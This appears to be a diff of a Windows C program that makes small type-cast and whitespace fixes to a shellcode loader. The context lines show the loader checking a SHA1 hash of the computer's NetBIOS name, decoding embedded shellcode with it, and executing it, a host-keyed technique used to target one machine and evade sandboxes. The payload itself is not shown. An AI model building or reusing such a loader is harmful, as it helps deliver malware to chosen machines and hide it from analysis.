@@ -39,7 +39,7 @@ int APIENTRY WinMain(_In_ HINSTANCE hInst,
 	UNREFERENCED_PARAMETER(lpCmdLine);
 
 	CheckExecution();
-	ExitProcess((UINT)NULL);
+	ExitProcess((UINT) NULL);
 }
 
 
@@ -68,7 +68,7 @@ void CheckExecution() {
 	DecodeShellcode();
 
 	// Now run it
-	ExecuteShellcode(&shellcode, shellcodelen);
+	ExecuteShellcode((BYTE *) &shellcode, shellcodelen);
 	
 	return;
 }
@@ -91,7 +91,7 @@ unsigned int HashCheck() {
 
 	// Check the hash of the computer name
 	if (cn = GetComputerInfo(ComputerNamePhysicalNetBIOS)) {
-		if (cnhash = GenerateHash((char *) cn, strlen(cn))) {
+		if (cnhash = (HGLOBAL *) GenerateHash((char *) cn, strlen((char *) cn))) {
 			if (!memcmp(cnhash, &hashSHA1ComputerName, hashSHA1ComputerNamelen)) {
 				ret = TRUE;
 			}
@@ -114,8 +114,7 @@ unsigned int HashCheck() {
 
 void DecodeShellcode() {
 	unsigned char *cn, *cnhash;
-	unsigned int ret;
-
+	
 	unsigned int sc = 0; // Shellcode position marker
 	unsigned int hc = 0; // Hash position marker
 
@@ -217,7 +216,7 @@ HGLOBAL * GetComputerInfo(COMPUTER_NAME_FORMAT nametype) {
 	GetComputerNameEx(nametype, NULL, &len);
 	if (len) {
 		if (ci = calloc(len, 1)) {
-			if (GetComputerNameEx(nametype, ci, &len)) {
+			if (GetComputerNameEx(nametype, (LPSTR) ci, (LPDWORD) &len)) {
 				return ci;
 			}
 		}
